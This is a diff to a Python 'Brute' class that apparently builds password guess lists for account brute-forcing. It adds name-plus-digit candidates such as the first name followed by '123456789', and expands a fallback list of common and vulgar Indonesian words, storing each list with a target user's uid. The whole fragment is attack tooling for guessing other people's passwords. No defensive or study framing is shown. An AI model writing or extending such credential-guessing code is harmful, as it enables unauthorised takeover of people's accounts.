@@ -85,30 +85,52 @@ class Brute:
 				if len(obj) == 1:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345',
+						obj[0]+'12345', obj[0]+'123456',
+      obj[0]+'1234567', obj[0]+'12345678',
+      obj[0]+'123456789',
 					]
 				elif len(obj) == 2:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
+      obj[0]+'123456', obj[0]+'1234567',
+      obj[0]+'12345678', obj[0]+'123456789',
 						obj[1]+'123', obj[1]+'12345',
+      obj[1]+'123456', obj[1]+'1234567',
+      obj[1]+'12345678', obj[1]+'123456789',
 					]
 				elif len(obj) == 3:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
+      obj[0]+'123456', obj[0]+'1234567',
+      obj[0]+'12345678', obj[0]+'123456789',
 						obj[1]+'123', obj[1]+'12345',
+      obj[1]+'123456', obj[1]+'1234567',
+      obj[1]+'12345678', obj[1]+'123456789',
 						obj[2]+'123', obj[2]+'12345',
+      obj[2]+'123456', obj[2]+'1234567',
+      obj[2]+'12345678', obj[2]+'123456789',
 					]
 				elif len(obj) == 4:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
+      obj[0]+'123456', obj[0]+'1234567',
+      obj[0]+'12345678', obj[0]+'123456789',
 						obj[1]+'123', obj[1]+'12345',
+      obj[1]+'123456', obj[1]+'1234567',
+      obj[1]+'12345678', obj[1]+'123456789',
 						obj[2]+'123', obj[2]+'12345',
+      obj[2]+'123456', obj[2]+'1234567',
+      obj[2]+'12345678', obj[2]+'123456789',
 						obj[3]+'123', obj[3]+'12345',
+      obj[3]+'123456', obj[3]+'1234567',
+      obj[3]+'12345678', obj[3]+'123456789',
 					]
 				else:
 					listpass = [
-						'sayang', 'doraemon',
-						'bangsat', 'kontol'
+						'sayang', 'Sayang', 'doraemon', 'Doraemon',
+						'bangsat','Bangsat', 'Kontol',
+      'kontol','123456', '123456789', 'Anjing', 
+      'anjing', 'Goblog', 'goblog',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
